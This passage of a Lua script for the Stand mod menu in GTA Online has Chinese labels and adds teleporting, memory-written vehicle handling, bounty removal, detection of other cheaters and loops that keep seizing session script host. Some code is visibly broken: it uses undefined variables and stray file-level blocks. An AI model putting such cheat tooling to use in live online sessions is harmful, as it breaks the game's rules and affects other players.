        x + width, y + height,
        border_color_left, border_color_right
    )
end
local function text(text, x, y, text_scale, highlighted)
    if highlighted then
        directx.draw_rect(
            x, y,
            window_width - (text_margin * 2), text_height,
            colour(15, 15, 15, 0)
        )
    end

    directx.draw_text(
        x, y, text, ALIGN_TOP_LEFT, text_scale,
        colour(255, 255, 255, 255)
    )
end
local insinsts = "FocusOut"
local function render_list(x, y, list, selected_index)
    local ty = 0
    local text_scale = 0.5

    for i,v in pairs(list) do
        local highlighed = i == selected_index - 1

        text(v, x, y + ty, text_scale, highlighed)
        ty = ty + text_height
    end
end

local function edition_string()
    local edition = menu.get_edition()

    if edition == 0 then
        return "免费版"
    elseif edition == 1 then
        return "基础版"
    elseif edition == 2 then
        return "荔枝版"
    elseif edition == 3 then
        return "毒毒版"
    end
end

local function render_menu()
    local width = window_width
    local height = window_height

    gui_background(window_x, window_y,
        width, height)

    text("Stand " .. edition_string(),
        window_x + text_margin,
        window_y + text_margin,
        0.6, false)
    
    local top_margin = 0.025
    
    render_list(
        window_x + text_margin,
        window_y + text_margin + top_margin,
        menu_items, selected_index
    )
end

local function set_menu_open(toggle) end 

local menu_is_open = false

local function input_handler()
    if menu.is_open() then return end

    local VK_NUMPAD8 = 0x68
    local VK_NUMPAD2 = 0x62

    if util.is_key_down(VK_NUMPAD2) then
        selected_index = selected_index + 1

    elseif util.is_key_down(VK_NUMPAD8) then
        selected_index = selected_index - 1

    end
end

local function tick_handler()
    if menu_is_open then
        render_menu()
    end

    input_handler()
    return true
end

blur_rect_instance = directx.blurrect_new()
util.create_tick_handler(tick_handler) 

function set_menu_open(toggle)
    if toggle and not menu_is_open then
        menu_is_open = true
        
    elseif not toggle and menu_is_open then
        menu_is_open = false

    end
end

menu.toggle(self, "展示选项", {}, "", function(toggle)
    set_menu_open(toggle)
end)
menu.toggle(self,"炫彩屏幕", {}, "", function(on)
    xuancaipm(on)
end)
menu.action(self, '刷新脚本', {}, '刷新这个脚本', function ()
    util.restart_script()
end)

menu.divider(online, "战局选项")
local minimap = menu.list(online, "小地图")
menu.toggle_loop(minimap, "派对地图", {"party_mode_cmd"}, "五彩斑斓的小地图", function(on)
    HUD.FLASH_MINIMAP_DISPLAY_WITH_COLOR(hud_rgb_colors[hud_rgb_index])
    hud_rgb_index = hud_rgb_index + 1
    if hud_rgb_index == 4 then
        hud_rgb_index = 1
    end
    util.yield(200)
end)
menu.toggle(minimap,"显示声纳", {"sonaronmap"}, "", function(on)
	HUD._SET_MINIMAP_SONAR_ENABLED(on)
end)
mapzoom = 1
menu.slider(minimap, "小地图缩放", {"minimapzoom"}, "", 0, 100, 0, 1, function(s)
    HUD.SET_RADAR_ZOOM_PRECISE(s)
end)

mapangle = 0
menu.slider(minimap,"小地图角度", {"minimapanglme"}, "", 0, 360, 0, 1, function(s)
    mapangle = s
end)

mapanglet = off
menu.toggle(minimap,"锁定地图角度", {"lockminimapangle"}, "", function(on)
	mapanglet = on
	while mapanglet do
		HUD.LOCK_MINIMAP_ANGLE(mapangle)
		util.yield()
	end
	HUD.UNLOCK_MINIMAP_ANGLE()
end)
 centermap = off
menu.toggle(minimap, "以你为中心的地图", {"centermap"}, "", function(on)
	centermap = on
	while centermap do 
		HUD.DONT_TILT_MINIMAP_THIS_FRAME()
		util.yield()
	end
end)
local players_root = menu.list(online,"玩家选项", {}, "")
menu.action(players_root, "玩家栏", {}, "", function()
    menu.trigger_commands("playerlist")
end)
frendlist = menu.list(players_root, "好友列表", {"fl"}, "", function(); 
end)
menu.divider(frendlist, "好友:)")
for i = 0 , get_friend_count() do
	local name = get_frined_name(i)
	if name == "*****" then goto yes end
	gen_fren_funcs(name)
	::yes::
end
local deez_nuts = {}
        local num_seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle))
        for i=1, num_seats do
            if num_seats >= 2 then
                deez_nuts[#deez_nuts + 1] = tostring(i - 2)
            else
                deez_nuts[#deez_nuts + 1] = tostring(i)
            end
        end
local seat_shifter_list = menu.list_action(zalei, "Are you ikun?", {}, "", {"Are you ikun?"}, function(index, value)
    if player_cur_car ~= 0 and value ~= "Are you ikun?" then
        if VEHICLE.IS_VEHICLE_SEAT_FREE(player_cur_car, tonumber(value), true) then 
            PED.SET_PED_INTO_VEHICLE(players.user_ped(), player_cur_car, tonumber(value))
        else
            notify("Are you ikun?")
        end
    end
end)
local last_vehicle_handling_data = {}
function set_vehicle_into_drift_mode(veh)
    local handling_values = {
        [0x0C] = 1900.0, -- fmass
        [0x20] = 0.0, -- vec com off x
        [0x24] = 0.0, -- vec com off y
        [0x28] = 0.0, -- vec com off z
        [0x30] = 1.0, -- vec inertia mult x
        [0x34] = 1.0, -- vec inertia mult y
        [0x38] = 1.0, -- vec inertia mult z
        [0x10] = 15.5, -- initial drag coeff
        [0x40] = 85.0, -- percent submerged
        [0x48] = 0.0,-- drive bias front
        [0x50] = 0.0,-- initial drive gears
        [0x60] = 1.9,-- initial drive force
        [0x54] = 1.0,-- fdrive interia
        [0x58] = 5.0,-- clutch change rate scale up
        [0x5C] = 5.0,-- clutch change rate scale down
        [0x68] = 200.0, -- initial drive max flat vel
        [0x6C] = 4.85, --  brake force
        [0x74] = 0.67, -- brake bias front
        [0x7C] = 3.5, -- handbrake force
        [0x80] = 1.2, -- steering lock
        [0x88] = 1.0, -- traction curve max
        [0x88] = 1.45, -- traction curve min
        [0x98] = 35.0, -- traction curve lateral
        [0xA0] = 0.15, -- traction curve spring delta max
        [0xA8] = 0.0, -- low speed traction loss mult
        [0xAC] = 0.0, -- camber stiffness
        [0xB0] = 0.45, -- traction bias front
        [0xB8] = 1.0, -- traction loss mult
        [0xBC] = 2.8, -- suspension force
        [0xC0] = 1.4, -- suspension comp damp
        [0xC4] = 2.2, -- suspension rebound damp
        [0xC8] = 0.06, -- suspension upper limit
        [0xCC] = -0.05, -- suspension lower limit
        [0xBC] = 2.8, -- suspension force
        [0xD0] = 0.0, -- suspension raise
        [0xD4] = 0.5, -- suspension bias front
        [0xD4] = 0.5, -- suspension bias front
    }
    for offset, value in pairs(handling_values) do 
        last_vehicle_handling_data[offset] = get_vehicle_handling_value(veh, offset)
        set_vehicle_handling_value(veh, offset, value)
    end
end

initial_d_mode = false
initial_d_score = false
function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
        if initial_d_mode then 
            set_vehicle_into_drift_mode(vehicle)
        end

        local deez_nuts = {}
        local num_seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle))
        for i=1, num_seats do
            if num_seats >= 2 then
                deez_nuts[#deez_nuts + 1] = tostring(i - 2)
            else
                deez_nuts[#deez_nuts + 1] = tostring(i)
            end
        end
        menu.set_list_action_options(seat_shifter_list, deez_nuts)

        if true then 
            native_invoker.begin_call()
            native_invoker.push_arg_int(vehicle)
            native_invoker.end_call("76D26A22750E849E")
        end

    end
end
peizhi = menu.list(players_root, "战局配置", {}, "加载战局配置", function(); end)
    load_peizhi = menu.action(peizhi, "加载战局配置", {""}, "", function()
        notification("正在加载战局配置,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.peizhi"
        menu.delete(load_peizhi)
    end)

local all_lyric_files = {}


local friends_in_this_session = {}
local modders_in_this_session = {}
local friends_in_session_list = menu.list_action(players_root,"战局中的好友", {"friendsinsession"}, "", friends_in_this_session, function(pid, name) 
    menu.trigger_commands("p" .. players.get_name(pid)) 
end)
local modders_in_session_list = menu.list_action(players_root,"战局中作弊者", {"moddersinsession"}, "", modders_in_this_session, function(pid, name) 
    menu.trigger_commands("p" .. players.get_name(pid)) 
end)
    util.create_tick_handler(function()
        for _, pid in players.list(true, true, true) do 
            local hdl = pid_to_handle(pid)
            if NETWORK.NETWORK_IS_FRIEND(hdl) or players.user() == pid then 
                if friends_in_this_session[pid] == nil then
                    friends_in_this_session[pid] = players.get_name(pid) .. ' [' .. players.get_tags_string(pid) .. ']'
                    menu.set_list_action_options(friends_in_session_list, friends_in_this_session)
                end
            end
    
            if players.is_marked_as_modder(pid) then 
                if modders_in_this_session[pid] == nil then
                    modders_in_this_session[pid] = players.get_name(pid) .. ' [' .. players.get_tags_string(pid) .. ']'
                    menu.set_list_action_options(modders_in_session_list, modders_in_this_session)
                end
            end
        end
    end)
    players.on_leave(function(pid, name)
        friends_in_this_session[pid] = nil
        menu.set_list_action_options(friends_in_session_list, friends_in_this_session)
        modders_in_this_session[pid] = nil
        menu.set_list_action_options(modders_in_session_list, modders_in_this_session)
    end)
    
    util.create_thread(function()
        while true do
            lyric_select_actions = menu.list_action(zalei,"Are you ikun?", {}, "", all_lyric_files, function(click_type)
                menu.show_warning(lyric_select_actions, click_type, "Are you ikun?", function()
                    local first_file = io.open(lyrics_dir .. '\\' .. value,  'r')
                    local deez_lyrics = first_file:read('*all')
                    first_file:close()
                    local second_file = io.open(filesystem.stand_dir() .. '\\' .. 'Song.lrc', 'w')
                    second_file:write(deez_lyrics)
                    second_file:close()
                    notify(value .. "loaded")
                end, function()
                    notify("Aborted.")
                end)
            end)
            
            menu.set_list_action_options(lyric_select_actions, all_lyric_files)
            util.yield(5000)
        end
    end)

    
HaojieDC = menu.list(online, "赌场豪杰", {}, "加载赌场豪杰", function(); end)
    Load_DC = menu.action(HaojieDC, "加载赌场豪杰", {""}, "", function()
        notification("正在加载赌场豪杰脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.HaojieDCscript"
        menu.delete(Load_DC)
    end)
    local detections = menu.list(online, "作弊检测", {}, "")
    menu.toggle_loop(detections, "无敌模式", {}, "检测是否在使用无敌.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            for i, interior in ipairs(interior_stuff) do
                if players.is_godmode(pid) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "是无敌,很有可能是作弊者")
                    break
                end
            end
        end 
    end)
    
    menu.toggle_loop(detections, "改装武器", {}, "检测是否有人使用无法在线获得的武器.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for i, hash in ipairs(modded_weapons) do
                local weapon_hash = util.joaat(hash)
                if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                    util.toast(players.get_name(pid) .. " 使用修改过的武器 " .. "(" .. hash .. ")")
                    break
                end
            end
        end
    end)
    
    menu.toggle_loop(detections, "改装载具", {}, "检测是否有人正在使用无法在线获得的车辆.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local modelHash = players.get_vehicle_model(pid)
            for i, name in ipairs(modded_vehicles) do
                if modelHash == util.joaat(name) then
                    util.draw_debug_text(players.get_name(pid) .. " 正在驾驶改装载具")
                    break
                end
            end
        end
    end)
    menu.toggle_loop(detections, "观看检测", {}, "检测是否有人在观看你.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            for i, interior in ipairs(interior_stuff) do
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                if not util.is_session_transition_active() and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
                and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                    if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                        util.toast(players.get_name(pid) .. " 正在观看你")
                        break
                    end
                end
            end
        end
    end)
   
    
    menu.toggle_loop(detections, "超级驾驶检测", {}, "检测是否有在修改载具车速", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
            local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
            local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
            if class ~= 15 and class ~= 16 and veh_speed >= 200 and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") or players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) then
                local PedID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
                util.toast(players.get_name(PedID) .. " 正在使用超级驾驶")
                break
            end
        end
    end)
    menu.toggle_loop(detections, "载具无敌模式", {}, "检测载具是否在使用无敌.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                for i, interior in ipairs(interior_stuff) do
                    if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                        util.draw_debug_text(players.get_name(pid) .. "载具处于无敌模式")
                        break
                    end
                end
            end
        end 
    end)
    
sihuachuansong = menu.list(online, "丝滑传送", {}, "德芙，纵享新丝滑:)", function(); end)
menu.action(sihuachuansong, "丝滑传送", {"stp"}, "在镜头平稳的情况下将您传送到您的航点,建议设置为一个hotkey", function ()
    SmoothTeleportToCord(Get_Waypoint_Pos2(), FRAME_STP)
end)
menu.toggle(sihuachuansong, "丝滑传送2.0", {"stpv2"}, "使您或您的车辆与镜头一起传送，来实现更丝滑的传送。", function(toggle)
    FRAME_STP = toggle
end)
menu.action(sihuachuansong, "重置镜头", {"resetstp"}, "将脚本 cam 渲染为 false，同时删除当前 cam。 因为如果你传送到海里，镜头鸡鸡了。", function ()
    local renderingCam = CAM.GET_RENDERING_CAM()
    CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
    CAM.DESTROY_CAM(renderingCam, true)
end)
local stpsettings = menu.list(sihuachuansong, "丝滑传送设置", {}, "")
menu.slider(stpsettings, "速度修改器（x）/10", {"stpspeed"}, "用于丝滑传送的速度修改器，乘法。 这将除以 10，因为滑块不能采用非整数", 1, 100, 10, 1, function(value)
    local multiply = value / 10
    if SE_Notifications then
        util.toast("丝滑速度倍增器设置为 " .. tostring(multiply) .. "!")
    end
    STP_SPEED_MODIFIER = 0.02 --set it again so it doesnt multiply over and over. This took too long to figure out....
    STP_SPEED_MODIFIER = STP_SPEED_MODIFIER * multiply
end)
menu.slider(stpsettings, "CAM过渡的高度（米）", {"stpheight"}, "在进行过渡时设置镜头的高度。", 0, 10000, 300, 10, function (value)
    local height = value
    if SE_Notifications then
        util.toast("丝滑传送高度设置为 " .. tostring(height) .. "!")
    end
    STP_COORD_HEIGHT = height
end)
menu.divider(sihuachuansong, "显示选项")
menu.toggle_loop(sihuachuansong, "显示当前位置", {"drawpos"},  "", function ()
    local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.0, 0.0, "x: " .. pos.x .. " // y: " .. pos.y .. " // z: " .. pos.z, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
end)
menu.toggle_loop(sihuachuansong, "显示X/Y轴", {"drawrot"}, "", function ()
    local rot = ENTITY.GET_ENTITY_ROTATION(GetLocalPed(), 2)
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.5, 0.03, "pitch: " .. rot.x .. " // roll: " .. rot.y .. " // yaw: " .. rot.z, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
    local facingtowards
    if ((rot.z >= 135) or (rot.z < -135)) then facingtowards = "-Y"
    elseif ((rot.z < 135) and (rot.z >= 45)) then facingtowards = "-X"
    elseif ((rot.z >= -135) and (rot.z < -45)) then facingtowards = "+X"
    elseif ((rot.z >= -45) or (rot.z < 45)) then facingtowards = "+Y" end
    directx.draw_text(0.5, 0.07, "Facing towards " .. facingtowards, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
end)
menu.toggle_loop(sihuachuansong, "显示实体数量", {"drawentpool"}, "", function ()
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    if EP_drawveh then
        local vehpool = entities.get_all_vehicles_as_pointers()
        directx.draw_text(EPS_vehx, EPS_vehy, "车辆," .. #vehpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawped then
        local pedpool = entities.get_all_peds_as_pointers()
        directx.draw_text(EPS_pedx, EPS_pedy, "NPC," .. #pedpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawobj then
        local objpool = entities.get_all_objects_as_pointers()
        directx.draw_text(EPS_objx, EPS_objy, "物体," .. #objpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawpick then
        local pickpool = entities.get_all_pickups_as_pointers()
        directx.draw_text(EPS_pickx, EPS_picky, "拾取物," .. #pickpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
end)
local shitichi = menu.list(sihuachuansong,"实体数量设置", {}, "")
menu.toggle(shitichi, "显示车辆", {}, "", function (toggle)
    EP_drawveh = toggle
end, true)
menu.slider(shitichi, "车辆文字摆放X", {"epvehposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_vehx = value / 100
end) 
menu.slider(shitichi, "车辆文字摆放Y", {"epvehposy"}, "/100", 0, 100, 3, 1, function (value)
    EPS_vehy = value / 100
end)
menu.toggle(shitichi, "显示NPC", {}, "", function (toggle)
    EP_drawped = toggle
end, true)
menu.slider(shitichi, "NPC 文本放置 X", {"eppedposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_pedx = value / 100
end)
menu.slider(shitichi, "NPC 文本放置 Y", {"eppedposy"}, "/100", 0, 100, 5, 1, function (value)
    EPS_pedy = value / 100
end)
menu.toggle(shitichi, "显示物体", {}, "", function (toggle)
    EP_drawobj = toggle
end, true)
menu.slider(shitichi, "物体文字放置X", {"epobjposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_objx = value / 100
end)
menu.slider(shitichi, "物体文字位置Y", {"epobjposy"}, "/100", 0, 100, 7, 1, function (value)
    EPS_objy = value / 100
end)
menu.toggle(shitichi, "显示拾取物", {}, "", function (toggle)
    EP_drawpick = toggle
end, true)
menu.slider(shitichi, "拾取文本放置X拾取文本放置Y显示拾取", {"epickjposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_pickx = value / 100
end)
menu.slider(shitichi, "拾取文本位置Y", {"epickjposy"}, "/100", 0, 100, 9, 1, function (value)
    EPS_picky = value / 100
end)
menu.divider(sihuachuansong, "设置")
menu.slider(sihuachuansong, "文本大小（/10）", {"drscale"}, "将文本的比例设置为您指定的值，除以 10。这是因为它只采用整数值", 1, 50, 5, 1, function (value)
    DR_TXT_SCALE = value / 10
end)
local Damage_points = menu.list(online, "显示伤害")
menu.toggle_loop(Damage_points, "显示伤害", {"damage_points"}, "", function()
    Damage_point()
end)
menu.toggle(Damage_points, "包括车辆", {"damagenumbersvehicles"}, "", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(Damage_points, "数字尺寸", {"damagenumberstextsize"}, "", 1, 100, 25, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
local damage_numbers_colours_list = menu.list(Damage_points, "颜色设置")
menu.rainbow(menu.colour(damage_numbers_colours_list, "默认颜色", {"damagenumcolour"}, "默认命中的颜色", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "暴击颜色", {"damagenumcritcolour"}, "暴击颜色", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "盔甲颜色", {"damagenumarmourcolour"}, "盔甲颜色", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "载具颜色", {"damagenumvehiclecolour"}, "载具颜色", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))
convenient = menu.list(online, "战局便捷功能", {}, "", function(); end)
menu.toggle(convenient, '现实时间', {'xssj'}, '与现实时间同步(可能有将近一分钟误差)，请先禁用Stand的时间 "平滑过渡".', function(toggle)
    xssj(toggle)
end)
menu.toggle_loop(convenient, "战局详情", {"hostqu"}, "", function()
    zhujixvlie()
    end)
    mcxh=1
mcr=255
mcg=0
mcb=0
menu.toggle(convenient, "显示脚本名称", {"scriptname"}, "", function(state)
    xianshijiaoben(state)
end)
    menu.toggle(convenient, "显示时间", {"timeos"}, "", function(state)
        xianshishijian(state)
    end)
    menu.toggle(convenient, "时速表", {"speedmeteor"}, "", function(state)
        speedm = state  
        while speedm do
            local ent
                local ent1 = players.user_ped()
                local ent2 = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1,true) then
                    ent = ent2
                else
                    ent = ent1
                end
                local speed = ENTITY.GET_ENTITY_SPEED(ent)
                local speedcalc = speed * 3.6
                myspeed1 = math.ceil(speedcalc)
            util.yield()
            draw_string(string.format("~bold~~italic~~b~"..myspeed1 .. "  ~r~KM/H"), 0.84,0.8, 1,5)
            end
    end,speedm)
local style_names = {"正常", "半冲刺", "反向", "无视红绿灯", "避开交通", "极度避开交通", "有时超车"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end
local overlay_x = 0.0052
local overlay_y = 0.18519
local run = false
local x, y = directx.get_client_size()
local ratio = x/y
local size = 0.03
local boxMargin = size / 7
local overlay_x = 0.0400
local overlay_y = 0.1850
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0

local function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end
local exists1, exists2, exists3 = false, false, false

local chaos, gravity, speed = false, true, 100

VT = menu.list(convenient, "按键显示", {}, "", function(); 
end)

menu.toggle(VT, '按键开关', {'wasd-overlay'}, '', function(on) 
	run = on
end, true)
menu.slider(VT, 'X轴坐标', {'x-position'}, '',1 , 10000, overlay_x * 10000, 1, function(value)
	overlay_x = value / 10000
end)
menu.slider(VT, 'Y轴坐标', {'y-position'}, '',1 , 10000, overlay_y * 10000, 1, function(value)
	overlay_y = value / 10000
end)
menu.slider(VT, '尺寸', {'size'}, '',1 , 10000, 300, 1, function(value)
	size = value / 10000
    boxMargin = size / 7
end)
local hideKey = false
menu.toggle(VT, '隐藏按键文本', {'hide-text'}, '', function(toggle)
    hideKey = toggle
end)
local color_root = menu.list(VT, '颜色', {''}, '')
menu.colour(color_root, '文本颜色', {'text-color'}, '', key_text_color, true, function(colour)
    key_text_color = colour
end)
menu.colour(color_root, '背景颜色', {'bg-color'}, '', background_colour, true, function(colour)
    background_colour = colour
end)
menu.rainbow(menu.colour(color_root, '按钮颜色', {'press-color'}, '', pressed_background_colour, true, function(colour)
    pressed_background_colour = colour
end))
local wasd = {
    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },
    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },
    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },
    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },
    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },
    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },
    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },
    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },
    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },
    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },
    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },
}
local hide_root = menu.list(VT, '隐藏按键', {''}, '')
for i = 1, #wasd do
    menu.toggle(hide_root, wasd[i].key, {}, '', function(toggle)
        wasd[i].show = not toggle
    end)
end
menu.toggle(VT, '短空格键', {'short-space'}, '', function(toggle)
    if toggle then
        spaceBarLength = 2
    else
        spaceBarLength = 3
    end
end)
menu.toggle(VT, '窄空格键', {'slim-space'}, '', function(toggle)
    if toggle then
        spaceBarSlim = 2
    else
        spaceBarSlim = 1
    end
end)
local center_space_toggle center_space_toggle = menu.toggle(VT, '中间空格键', {'alt-space'}, '使空格在 A、S、D 下居中。这需要shift和ctrl关闭.', function(toggle)
    if altShiftCtrl and (wasd[10].show or wasd[9].show) then
        altSpaceBar = 1
        return
    end
    if toggle then
        altSpaceBar = 0
    else
        altSpaceBar = 1
    end
end, true)
menu.toggle(VT, '窄 shift和ctrl键', {'slim-shift-ctrl'}, '', function(toggle)
    altShiftCtrl = toggle
    if toggle and menu.get_value(center_space_toggle) == 1 then
        menu.trigger_command(center_space_toggle, 'off')
    else
        menu.trigger_command(center_space_toggle, 'on')
    end
end)
util.create_tick_handler(function()
    if run then
        for i = 1, #wasd do
            wasd[i].pressed = false
            for j = 1, #wasd[i].keys do
                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                    wasd[i].pressed = true
                end
            end
        end
        for i = 1, #wasd - 3 do
            if wasd[i].show then
                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
            end
        end
        if altShiftCtrl then
            if wasd[#wasd - 2].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
            end
            if wasd[#wasd - 1].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
            end
        else
            for i = 9, 10 do
                if wasd[i].show then
                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
                end
            end
        end
        if wasd[#wasd].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
        end
	end
end)



menu.action(convenient,"移除自身悬赏", {}, "一键清除赏金 妈妈再也不用担心我被人追杀了呢！", function()
    ycxs()
end)
  menu.toggle_loop(convenient, "快速脚本主机", {}, "更快版本的脚本主机", function()
    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)
menu.toggle_loop(convenient, "自动获得脚本主机", {}, "自动化获取脚本主机（加载战局会快哦!）", function()
    menu.trigger_commands("scripthost")
  end)
  local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end
menu.toggle_loop(convenient, "自动接受加入游戏", {}, "将自动接受加入任务", function() 
    local message_hash = C_CCHUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(50)
    end
end)
